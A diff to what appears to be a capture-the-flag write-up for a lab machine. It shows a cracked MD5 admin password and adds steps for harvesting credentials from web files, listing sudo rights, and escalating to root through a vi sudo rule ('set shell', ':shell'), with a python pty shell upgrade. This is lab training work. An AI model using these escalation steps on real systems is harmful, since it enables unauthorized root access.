@@ -69,3 +69,34 @@ Found MD5 password for user admin:
 2cb42f8734ea607eefed3b70af13bbd3
 
 Hashcatted: 2cb42f8734ea607eefed3b70af13bbd3:qwerty789
+
+---
+Since the machine uses both PHP & SQL, there should be credentials in clear text:
+
+Consider reviewing files inside /var/www/html
+
+Gathered ssh credentials.
+
+Executing sudo -l would provide permissions denial to escalate. Identified commands allowed for user:
+
+$ sudo -l
+
+User postgres may run the following commands on vaccine:
+
+(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+Using [https://gtfobins.github.io/gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo) we can see how to abuse privileges from vulnerable commands.
+
+for this scenario, we set shell to /bin/sh
+
+:set shell=/bin/sh
+
+Then we run the shell
+
+:shell
+
+We can now beautify our shell again:
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+System Pwned!
